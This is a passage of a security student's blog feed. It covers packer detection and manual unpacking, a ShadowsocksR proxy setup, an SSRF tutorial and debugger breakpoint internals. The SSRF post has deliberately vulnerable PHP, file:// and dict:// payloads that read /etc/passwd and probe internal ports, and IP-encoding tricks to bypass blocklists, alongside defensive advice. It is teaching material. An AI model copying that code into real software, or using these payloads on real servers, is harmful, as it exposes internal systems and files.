非独立编译带运行库</h3><p>程序需要一个运行库<code>krnln.fnr</code><br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/独立.png" alt></p><p>OD直接打开代码入口特点:<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/易语言2.png" alt><br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/易语言4.png" alt><br>上两图框内能看到入口特征和模块特征 <code>krnln.fnr</code></p><p>用侦壳软件显示<code>nothing found</code><br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/易语言3.png" alt></p><p>易语言特点：</p><ol><li>可以从程序里找一些call的调用最终都会走到上面核心代码图位置,这个方法可以区分和VC的区别.(拖到程序最上面随便找几个call跟随 都会跳到接口的地方)</li><li>或者右键智能搜索字符串</li><li>非独立编译比较容易识别，入口特征和模块特征都有<code>krnln.fnr</code>.</li></ol><h2 id="2-4-Delhpi编译无壳程序"><a href="#2-4-Delhpi编译无壳程序" class="headerlink" title="2.4 Delhpi编译无壳程序"></a>2.4 Delhpi编译无壳程序</h2><p>区段特征:</p><p><img src="/2020/02/24/软件加壳的基础知识与程序的特征/Delhpi.png" alt></p><p>入口特征: 第一个call里的内容<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/delhpi2.png" alt></p><p>Delhpi特点：</p><ol><li>很多很多区段</li><li>入口特征第一个call里的加壳代码</li></ol><h2 id="2-5-BC-编译无壳程序"><a href="#2-5-BC-编译无壳程序" class="headerlink" title="2.5 BC++编译无壳程序"></a>2.5 BC++编译无壳程序</h2><p>入口特征: 很大的一个jump<br>区段和Delphi差不多</p><h2 id="2-6-autoIT-脚本语言"><a href="#2-6-autoIT-脚本语言" class="headerlink" title="2.6 autoIT 脚本语言"></a>2.6 autoIT 脚本语言</h2><p>查找字符串<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/autoIT.png" alt></p><h1 id="3-侦壳"><a href="#3-侦壳" class="headerlink" title="3. 侦壳"></a>3. 侦壳</h1><h2 id="3-1-PEiD、Exeinfo-PE等查壳工具"><a href="#3-1-PEiD、Exeinfo-PE等查壳工具" class="headerlink" title="3.1 PEiD、Exeinfo PE等查壳工具"></a>3.1 PEiD、Exeinfo PE等查壳工具</h2><p>通过PEiD、Exeinfo PE等查壳工具内置<strong>各种壳的十六进制特征码</strong>进行对比查壳</p><p>PEiD、FFI、FastScanner、RDG Packer Detector这类程序都是通过目录下的userdb.txt（查壳程序不同可能数据库名有出入）<strong>数据库进行加壳程序特征对比</strong>的，全球基本都在用fly在09年发布的UpKPEiDSign，更新都没有太好效果，由于<strong>原理都是通过加壳程序的特征进行对应</strong>，而这些加壳特征都是个人总结而来，对加壳程序的模糊搜索对比造成可靠性不高，特别是对于VMProtect这类加密壳程序，经常被识别成一些算七八糟都没见过的加壳内容，特别是显示UPolyX，基本都是误报，但对于传统的一些压缩壳的识别效果还是很好的，有利有弊，正是由于它的开放性特征库，也方便给大家提供自己编写特征的方法，来识别一些新的壳.</p><p>Exeinfo PE属于新一代查壳工具，它和PEiD的区别可能就在于它的特征库是作者自己维护，不支持外部修改，新版好像也开始支持外部特征库了，这款查壳工具的加壳特征库比较准确而且范围很广，如ThemIDA、WinLicense、VMProtect、ZProtect、Shielden都可以轻松识别出来.</p><h2 id="3-2-通过入口特征和区段特征来识别"><a href="#3-2-通过入口特征和区段特征来识别" class="headerlink" title="3.2 通过入口特征和区段特征来识别"></a>3.2 通过入口特征和区段特征来识别</h2><h3 id="3-2-1-区段信息"><a href="#3-2-1-区段信息" class="headerlink" title="3.2.1 区段信息"></a>3.2.1 区段信息</h3><p>区段信息可以通过PEiD的EP处点击获取到</p><h3 id="3-2-2-入口特征"><a href="#3-2-2-入口特征" class="headerlink" title="3.2.2 入口特征"></a>3.2.2 入口特征</h3><p>入口特征可以通过OllyDBG载入获得，载入后可以按一下“Ctrl+A”，让OD分析一下代码，就可以把入口点一些特征字符串分析出来，对于Shielden、Safengine、VProtect这类加壳程序都可以使用这种方法判断出来。</p><p>来源: <a href="https://www.52pojie.cn/thread-234739-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-234739-1-1.html</a></p><h1 id="4-脱壳"><a href="#4-脱壳" class="headerlink" title="4. 脱壳"></a>4. 脱壳</h1><h2 id="4-1-脱壳原理"><a href="#4-1-脱壳原理" class="headerlink" title="4.1 脱壳原理"></a>4.1 脱壳原理</h2><ol><li>首先修改被加壳程序的入口点到程序原来的OEP.(单步跟踪之类的)</li><li>然后修改PE程序导入表目录地址为原来导入表地址，或者新建一个节.</li><li>将这个新节作为导入表节，并将原导入表内容写入新节导入表.(修补IAT)</li></ol><h2 id="4-2-脱壳过程"><a href="#4-2-脱壳过程" class="headerlink" title="4.2 脱壳过程"></a>4.2 脱壳过程</h2><h3 id="4-2-1"><a href="#4-2-1" class="headerlink" title="4.2.1"></a>4.2.1</h3><p>静态脚本: 完全逆着原来的compress代码 做decompressi操作 要求较高 要去逆或者看源码, 大多数脱壳机也是这么来的</p><p>手脱: 找到程序原来OEP并修改, 修复IAT=&gt; 脱壳成功. 具体操作看<code>常见壳的手脱练习</code></p><ol><li>OD跟踪，让壳运行到原程序OEP（不一定非得OEP，程序领空导入表一般都是处于还原状态，OEP要知道</li><li>这时候可以用PE DUMP脱壳插件或者用LordPe等工具脱壳，程序当前的内存映像被dump出来，里面IAT结构完整很容易被发现。</li><li>dump后程序不能正常运行很可能是导入表位置错误（也可能是程序有自校验），因为dump出来的只是内存中的映像快照，<strong>导入表目录还是指向壳的导入表</strong>，这时，需要用导入表修复软件查找dump出的PE文件<strong>原导入表首地址</strong>，然后修正导入表目录中导入表的位置，或重建导入表。(修复IAT)</li><li><code>Import Fix</code>导入表修复软件会新建一个节来保存原导入表数据，并将导入表目录指向新节导入表位置。在搜索导入表时可能导入表被破坏，Import Fix会识别出一些无效的IAT项，可以将其剔除掉。<strong>一般直接上OD插件修复IAT</strong></li></ol><h2 id="5-脱壳结束判定"><a href="#5-脱壳结束判定" class="headerlink" title="5. 脱壳结束判定"></a>5. 脱壳结束判定</h2><p>对照无壳程序入口特征即可</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;先恭喜黄同学被 伦敦大学学院UCL 的 Msc information security 专业录取, 撒花~鼓掌~, 未来可期 名校加身 见更多的人 体验完全不同的生活 &lt;strike&gt;即将开始自闭的留学生活23333&lt;/strike&gt;.(能有自己一个带独卫的房间真是太好了)&lt;br&gt;写的尽量简单一点 因为快到ddl了&lt;br&gt;估计再研究一段时间就要转移动安全了 毕竟win下的软件加密加壳需求也少了 大家都去做手机app了&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="http://Ronpa.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>simple realization of VPN tunnel</title>
    <link href="http://ronpa.top/2019/12/04/simple-realization-of-VPN-tunnel/"/>
    <id>http://ronpa.top/2019/12/04/simple-realization-of-VPN-tunnel/</id>
    <published>2019-12-04T18:18:14.000Z</published>
    <updated>2021-01-25T19:27:45.096Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>just for fun</p></blockquote><a id="more"></a><h1 id="some-definitions"><a href="#some-definitions" class="headerlink" title="some definitions"></a>some definitions</h1><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><h3 id="VPN-full-name-virtual-private-network"><a href="#VPN-full-name-virtual-private-network" class="headerlink" title="VPN full name: virtual private network."></a>VPN full name: <strong>virtual private network</strong>.</h3><p>Function: provide safe and reliable communication channels, enterprises use more. VPN is to establish encrypted communication channels on the public network. For example, what should employees do if they want to log in to the company’s intranet mailbox when they are in their dormitories? VPN can be used for remote connection.</p><h2 id="SS-amp-SSR"><a href="#SS-amp-SSR" class="headerlink" title="SS &amp; SSR"></a>SS &amp; SSR</h2><h3 id="SS-full-name-shadowsocks"><a href="#SS-full-name-shadowsocks" class="headerlink" title="SS full name: shadowsocks."></a>SS full name: <strong>shadowsocks</strong>.</h3><p>Shadowsokks is a agent software. This software can intelligently judge whether the visited website is forbidden or not. The forbidden website will be accessed through a remote server. </p><h3 id="SSR-full-name-shadowsocks-R"><a href="#SSR-full-name-shadowsocks-R" class="headerlink" title="SSR full name: shadowsocks-R."></a>SSR full name: <strong>shadowsocks-R</strong>.</h3><p>The author of SSR claims that SS is not hidden enough and easy to be detected by the firewall. SSR improves the confusion and protocol and is more difficult to be detected by the firewall. In short, SSR is an improved version of SS.</p><ol><li>the client sends the request (based on Socks5 protocol), and the sock5 protocol is transformed and encrypted through the SSR client, so that the traffic from the client is no different from the traffic based on HTTP protocol; </li><li>after the SSR server (proxy server) receives the request, the data is decrypted and restored, and finally the protocol is forwarded To the target server.</li></ol><p><img src="/2019/12/04/simple-realization-of-VPN-tunnel/ssr.png" alt></p><h2 id="difference-between-VPN-SSR-and-SS"><a href="#difference-between-VPN-SSR-and-SS" class="headerlink" title="difference between VPN, SSR and SS"></a>difference between VPN, SSR and SS</h2><p>The purpose is different. VPN is to ensure the security and privacy of communication; SS / SSR is to forward client traffic, bypass the detection of firewall, but it does not guarantee the security of data transmission.</p><h2 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h2><p><strong>Virtual private server</strong> means that you buy a virtual server on the Internet and others manage it for you. You just need to use it. It’s very easy. We can use foreign cloud servers to let VPS visit youtube and other websites for us through SSR proxy.</p><h1 id="Steps-of-building-SSR-proxy-server-with-VPS"><a href="#Steps-of-building-SSR-proxy-server-with-VPS" class="headerlink" title="Steps of building SSR proxy server with VPS"></a>Steps of building SSR proxy server with VPS</h1><h2 id="Purchase-VPS-server-foreign-VPS"><a href="#Purchase-VPS-server-foreign-VPS" class="headerlink" title="Purchase VPS server foreign VPS"></a>Purchase VPS server foreign VPS</h2><p>The common foreign cloud server providers are: Digital Ocean, vultr, bandwagonhost,Amazon cloud, etc. </p><p>And you also can buy a vps from Hongkong or Taiwan.<br></p><p>vultr <a href="http://www.vultr.com" target="_blank" rel="noopener">http://www.vultr.com</a></p><p>I purchased a vps in singapore<br><img src="/2019/12/04/simple-realization-of-VPN-tunnel/singapore.png" alt><br>(pricey!!!! It’s really convenient for this website to support Alipay)<br><img src="/2019/12/04/simple-realization-of-VPN-tunnel/host.png" alt><br>In the management interface, you can see a series of information such as SSH password, user name, IP address, etc</p><h2 id="Deploy-VPS-server-ssr"><a href="#Deploy-VPS-server-ssr" class="headerlink" title="Deploy VPS server (ssr)"></a>Deploy VPS server (ssr)</h2><p>connect my vps by ssh. (Before that, you can try to ping your remote host)</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;-p port&gt; username<span class="keyword">@IP</span>　　<span class="comment">//sign in</span></span><br><span class="line">scp road  username<span class="keyword">@IP</span>:road　　<span class="comment">//upload file to ssh server</span></span><br><span class="line">passwd username  <span class="comment">//change password</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/04/simple-realization-of-VPN-tunnel/link.png" alt></p><p>download and isntall ssr server. Set ssr software on your vps as a ssr proxy server.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --<span class="keyword">no</span>-check-certificate http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/teddysun/shadowsocks_install/master/shadowsocksR.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/04/simple-realization-of-VPN-tunnel/ssh-install.png" alt></p><p>Wait for the command execution of the previous step to finish, and then continue to execute the command:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chmod</span> +<span class="selector-tag">x</span> <span class="selector-tag">shadowsocksR</span><span class="selector-class">.sh</span></span><br></pre></td></tr></table></figure><p>Wait for the command execution of the previous step to finish, and then continue to execute the command:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shadowsocksR.sh <span class="number">2</span>&gt;&amp;<span class="number">1</span> | tee shadowsocksR.log</span><br></pre></td></tr></table></figure><p>According to the needs of choice, will let you choose the data encryption method, website access method and so on, the default carriage return is recommended. You will be prompted to enter the password and port of your SSR server. No input is the default. After running the command, the information of your SSR client will come out.<br>After all selections are completed, the installation is successful when the following command appears:</p><p><img src="/2019/12/04/simple-realization-of-VPN-tunnel/con.png" alt></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Congratulations, ShadowsocksR server install completed!</span><br><span class="line">Your Server IP :IP</span><br><span class="line">Your Server Port :端口</span><br><span class="line">Your Password :密码</span><br><span class="line">Your Protocol :协议</span><br><span class="line">Your obfs :混淆</span><br><span class="line">Your Encryption <span class="function"><span class="keyword">Method</span>:</span>your_encryption_method</span><br><span class="line"></span><br><span class="line">Welcome <span class="keyword">to</span> visit:https:<span class="comment">//shadowsocks.be/9.html</span></span><br><span class="line">Enjoy it!</span><br></pre></td></tr></table></figure><p>warning! when appear this error, that mean this script couldn’t apply to centos 8, you have to change your os version.<br><img src="/2019/12/04/simple-realization-of-VPN-tunnel/error.png" alt></p><h2 id="Install-ssh-client-on-pc"><a href="#Install-ssh-client-on-pc" class="headerlink" title="Install ssh client on pc"></a>Install ssh client on pc</h2><p><a href="https://www.4d6.cn/forum.php?mod=viewthread&amp;tid=239&amp;highlight=ss" target="_blank" rel="noopener">https://www.4d6.cn/forum.php?mod=viewthread&amp;tid=239&amp;highlight=ss</a><br><img src="/2019/12/04/simple-realization-of-VPN-tunnel/ssr-download.png" alt></p><p>set vps’ip as target.<br><img src="/2019/12/04/simple-realization-of-VPN-tunnel/client.png" alt></p><p>Right click the shadowsocks icon in the lower right corner of the computer. Enable system agent.</p><h2 id="finish-amp-congratulation"><a href="#finish-amp-congratulation" class="headerlink" title="finish &amp; congratulation!!!"></a>finish &amp; congratulation!!!</h2><p><img src="/2019/12/04/simple-realization-of-VPN-tunnel/youtube.png" alt></p><p>remember change your host key of mac after restarting vps</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/Users/u</span>sername<span class="regexp">/.ssh</span></span><br></pre></td></tr></table></figure><p>When not in use, you can directly destory service, which is not chargeable. You can create a new server the next time you use it<br><img src="/2019/12/04/simple-realization-of-VPN-tunnel/destory.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;just for fun&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Sketches" scheme="http://Ronpa.top/tags/Sketches/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发-SSRF攻击</title>
    <link href="http://ronpa.top/2019/07/04/PHP%E5%BC%80%E5%8F%91-SSRF%E6%94%BB%E5%87%BB/"/>
    <id>http://ronpa.top/2019/07/04/PHP%E5%BC%80%E5%8F%91-SSRF%E6%94%BB%E5%87%BB/</id>
    <published>2019-07-04T19:40:44.000Z</published>
    <updated>2021-01-25T19:26:53.068Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>关于SSRF(Server-Side Request Forgery:服务器端请求伪造)的研究介绍<br>搞逆向的来讲这个完全是被课逼的, 讲了能加平时分233333<br>sudo /opt/lampp/manager-linux-x64.run<br>sudo /usr/local/VSCode-linux-x64/code</p></blockquote><a id="more"></a><h1 id="1-SSRF简介"><a href="#1-SSRF简介" class="headerlink" title="1. SSRF简介"></a>1. SSRF简介</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原理：由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p><img src="/2019/07/04/PHP开发-SSRF攻击/简介.png" alt><br>A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的网站。<br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。<br></p><p>A网站未对用户请求进行过滤检查, 导致被利用去访问其他服务器,甚至获取相连的内网服务器的数据(伪造由A服务端发起的请求)</p><h1 id="2-SSRF用途"><a href="#2-SSRF用途" class="headerlink" title="2 SSRF用途"></a>2 SSRF用途</h1><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li><li>攻击运行在内网或本地的应用程序（比如：溢出 ddos）</li><li>对内网web应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如：Struts2，sqli等）</li><li>利用file协议读取本地文件等</li></ol><h2 id="2-1-端口扫描"><a href="#2-1-端口扫描" class="headerlink" title="2.1 端口扫描"></a>2.1 端口扫描</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">$link = $_POST[<span class="string">'url'</span>]; <span class="comment">#获取用户的url输入</span></span></span><br><span class="line"><span class="php">$filename = <span class="string">'./curled/'</span>.rand().<span class="string">'txt'</span>; </span></span><br><span class="line"><span class="php"><span class="comment">// 创建一个新cURL资源 </span></span></span><br><span class="line"><span class="php">$curlobj = curl_init($link); </span></span><br><span class="line"><span class="php">$fp = fopen($filename,<span class="string">"w"</span>); </span></span><br><span class="line"><span class="php"><span class="comment">// 设置URL和相应的选项 </span></span></span><br><span class="line"><span class="php">curl_setopt($curlobj, CURLOPT_FILE, $fp); <span class="comment">//传输选项 设置输出文件</span></span></span><br><span class="line"><span class="php">curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>); </span></span><br><span class="line"><span class="php"><span class="comment">// 抓取URL并把它传递给浏览器 </span></span></span><br><span class="line"><span class="php">curl_exec($curlobj); </span></span><br><span class="line"><span class="php">curl_close($curlobj); </span></span><br><span class="line"><span class="php"><span class="comment">//关闭cURL资源，并且释放系统资源 </span></span></span><br><span class="line"><span class="php">fclose($fp); </span></span><br><span class="line"><span class="php">$fp = fopen($filename,<span class="string">"r"</span>); </span></span><br><span class="line"><span class="php">$result = fread($fp, filesize($filename)); </span></span><br><span class="line"><span class="php">fclose($fp); </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $result; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span> </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"px"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"./ssrf1.php"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"commit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以先把这段代码放在网站根目录下，然后尝试探测端口，这里以3306端口作为例子<br>在文本框内输入<code>http://127.0.0.1:3306</code>，会发现该服务器上的数据库版本信息以及系统的版本信息会被回显出来<br><img src="/2019/07/04/PHP开发-SSRF攻击/ssrf2.png" alt></p><p>同样的我们测试22端口，也会出现类似效果<br><img src="/2019/07/04/PHP开发-SSRF攻击/ssrf3.png" alt></p><p>利用burp suite可以扫描所有的端口 达到内网漫游的效果 扫描内网所有端口上开的服务<br><img src="/2019/07/04/PHP开发-SSRF攻击/port2.png" alt><br><img src="/2019/07/04/PHP开发-SSRF攻击/port.png" alt></p><p>这也解释了为什么防御手段的第一点需要过滤返回信息</p><h2 id="2-2-读取文件"><a href="#2-2-读取文件" class="headerlink" title="2.2 读取文件"></a>2.2 读取文件</h2><h3 id="2-2-1-file协议"><a href="#2-2-1-file协议" class="headerlink" title="2.2.1 file协议"></a>2.2.1 file协议</h3><p>用户可控的输入点是<code>$_GET[&#39;url&#39;]</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建一个新cURL资源 </span></span></span><br><span class="line"><span class="php">$ch = curl_init(); </span></span><br><span class="line"><span class="php"><span class="comment">// 设置URL和相应的选项 </span></span></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span></span><br><span class="line"><span class="php">curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>); </span></span><br><span class="line"><span class="php"><span class="comment">// 抓取URL并把它传递给浏览器 </span></span></span><br><span class="line"><span class="php">curl_exec($ch); </span></span><br><span class="line"><span class="php"><span class="comment">//关闭cURL资源，并且释放系统资源 </span></span></span><br><span class="line"><span class="php">curl_close($ch); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>本地文件传输协议 主要用于访问本地计算机中的文件<br>尝试用file协议读取文件，很明显文件能够被访问<br><code>?url=file:///../../../../../../etc/passwd</code></p><p><img src="/2019/07/04/PHP开发-SSRF攻击/file.png" alt></p><h3 id="2-2-2-dict协议"><a href="#2-2-2-dict协议" class="headerlink" title="2.2.2 dict协议"></a>2.2.2 dict协议</h3><p>dict协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，但是在SSRF中如果可以使用dict协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息。 </p><p>如请求<a href="http://192.168.163.150/test.php?url=dict://127.0.0.1:3306/info" target="_blank" rel="noopener">http://192.168.163.150/test.php?url=dict://127.0.0.1:3306/info</a> 可以获取目标主机的3306端口上运行着mysq-l5.5.55版本的应用。</p><p>并执行扫描脚本探测内网主机的端口和服务<br>PHP中常用的包含调用函数有：include(), require(), include_once(), require_once()<br>就是把被包含的文件的代码拿过来当作自己的源码的一部分，所以，php文件包含机制有个特性：哪怕被包含的文件是个txt文件，它也会被包含文件所在的服务器当作脚本去执行：<br><img src="/2019/07/04/PHP开发-SSRF攻击/ssrf1.png" alt></p><h1 id="3-如何防御"><a href="#3-如何防御" class="headerlink" title="3 如何防御"></a>3 如何防御</h1><ol><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态(防御扫端口)</li><li>闲置请求的端口为http常用的端口，比如：80、443、8080、8090</li><li>黑名单内网IP，避免应用被用来获取内网数据，攻击内网(禁止与外网相连的服务器访问特定的内网IP)</li><li>禁用不需要的协议，仅允许http和https的请求(防止使用上面的file dict协议进行操作)</li></ol><h1 id="4-如何绕过"><a href="#4-如何绕过" class="headerlink" title="4 如何绕过"></a>4 如何绕过</h1><p>当开发者对于一些明显的ip特征可能会做一些防护，这时候就需要去绕过，这里提供几种绕过方法</p><ol start="2"><li>IP地址转换成进制：127.0.0.1 = 2130706433 115.239.210.26 = 16373751032(绕过黑名单)</li><li>使用短地址来生成内网地址：<a href="http://10.10.116.11" target="_blank" rel="noopener">http://10.10.116.11</a> = <a href="http://t.cn/RwbLKDx(绕过黑名单)" target="_blank" rel="noopener">http://t.cn/RwbLKDx(绕过黑名单)</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;关于SSRF(Server-Side Request Forgery:服务器端请求伪造)的研究介绍&lt;br&gt;搞逆向的来讲这个完全是被课逼的, 讲了能加平时分233333&lt;br&gt;sudo /opt/lampp/manager-linux-x64.run&lt;br&gt;sudo /usr/local/VSCode-linux-x64/code&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://Ronpa.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Windows消息机制-消息断点</title>
    <link href="http://ronpa.top/2019/05/22/Windows%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6-%E6%B6%88%E6%81%AF%E6%96%AD%E7%82%B9/"/>
    <id>http://ronpa.top/2019/05/22/Windows%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6-%E6%B6%88%E6%81%AF%E6%96%AD%E7%82%B9/</id>
    <published>2019-05-22T13:35:41.000Z</published>
    <updated>2021-01-25T19:28:05.803Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>知识补坑: 消息断点 消息机制 断点类型</p></blockquote><a id="more"></a><h1 id="断点类型"><a href="#断点类型" class="headerlink" title="断点类型"></a>断点类型</h1><p>断点的种类有以下几种:</p><p>CC断点, 内存断点, 硬件断点, 条件断点, 条件记录断点, 消息断点</p><h2 id="CC断点"><a href="#CC断点" class="headerlink" title="CC断点"></a>CC断点</h2><blockquote><p>更改断下位置开头的机器码 变为 in3</p></blockquote><p>这个是最常见的 OD里F2之后变红的那种 又叫int3断点又叫F2断点<br><br>原理是, 执行<code>int3</code>时程序就会暂停, 而int3指令的机器码就是<code>CC</code></p><p>用F2设置断点时, <strong>OD会将被下段处的机器码的首字节替换为CC</strong>, 当程序执行到这里, 执行<code>int3</code>而被断下, 程序暂停。接着OD将CC恢复为原始代码就能执行真机器码了。执行完毕后又将机器码的首字节替换为CC , 所以下次运行到这里时然会被再次断下。</p><p>设置CC断点它的好处是可以设置无数个, 坏处是容易被检测到, 进而执行干扰调试的反调试程序。例如<code>0xCC</code> int3断点检测 有些调试器下断会改变文件值 遍历全局去检测是否有字节为<code>0xCC</code>来检测是否被调试</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v9 = GetTickCount();</span><br><span class="line">  v5 = &amp;loc_401052;</span><br><span class="line">  v6 = 64;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( !v6 )</span><br><span class="line">      break;</span><br><span class="line">    v4 = *v5++ == 0xCCu;</span><br><span class="line">    --v6;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( !v4 );</span><br><span class="line"> <span class="built_in"> if </span>( v4 )</span><br><span class="line">    v11 = 1;</span><br><span class="line">  v7 = (GetTickCount() - v9) / 0x3E8 &gt; 1;</span><br><span class="line">  sub_4011E0(v11, (int)&amp;v19, v7);</span><br></pre></td></tr></table></figure><p>上面的代码 两个调用<code>GetTickCount()</code>来检测时间间隔 并且中间有遍历文件入口检测int3断点的语句 一旦在两次调用间下断点或者有<code>int3</code>断点 就会得到错误的参数v7</p><h2 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h2><blockquote><p>内存页属性设置不可访问, OD接受异常</p></blockquote><p>相较于CC断点, 检测内存断点相对更难些, 也更不容易被断下。<br><br>OD设置方法: 右击一行代码-断点-内存访问/写入断点<br><br>执行和访问此处代码均会触发断点: 访问=写入+执行</p><ol><li>执行即把机器码当成程序执行时被断下(程序自然运行到此处)</li><li>写入即改写这部分机器码时被断下(调用此处资源或者函数)</li></ol><p>内存断点的原理：内存断点的实现方式是将你欲下断地址所在的<strong>内存页</strong>增加一个名为<code>PAGE_NOACCESS</code>的属性, 这个属性会<strong>把当前内存页设为禁止任何形式的访问</strong>, 如果进行访问会触发一个<strong>内存访问异常</strong>。在这同时, od开始捕获目标程序中出现的这个异常, 并判断触发这个异常的位置是否跟你下断的地址相同, 如果相同则内存断点触发, 暂停被调试程序的运行, 